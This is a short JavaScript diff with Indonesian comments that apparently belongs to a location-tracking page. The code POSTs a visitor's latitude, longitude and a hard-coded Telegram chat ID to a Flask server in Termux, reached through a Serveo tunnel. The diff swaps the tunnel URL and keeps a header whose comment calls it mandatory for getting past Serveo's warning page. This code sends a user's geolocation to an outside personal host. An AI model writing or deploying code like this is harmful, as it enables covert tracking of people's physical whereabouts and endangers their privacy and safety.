@@ -108,16 +108,16 @@
         const targetChatId = userIdAdmin ? userIdAdmin : "6953925929"; 
         
         // PERBAIKAN UTAMA: Tambahkan https:// dan endpoint /input_lokasi sesuai route Flask
-        const URL_SERVER_TERMUX = "https://testerbottelee2.serveousercontent.com";
+        const URL_SERVER_TERMUX = "https://exeunt.serveousercontent.com";
 
         // 3. Mengirimkan koordinat ke server Flask di Termux
         fetch(URL_SERVER_TERMUX, {
     method: 'POST',
     headers: { 
         'Content-Type': 'application/json',
-        'serveo-skip-browser-warning': 'true' // <-- TAMBAHKAN BARIS INI
+        'serveo-skip-browser-warning': 'true' // <-- WAJIB ADA agar tidak diblokir halaman warning Serveo
     },
-    mode: 'cors', // <-- Tambahkan ini untuk mengizinkan request lintas domain
+    mode: 'cors',
     body: JSON.stringify({
         lat: lat,
         lon: lon,
@@ -125,6 +125,7 @@
         uid: targetChatId
     })
 })
+
 
         .then(res => {
             if (!res.ok) {
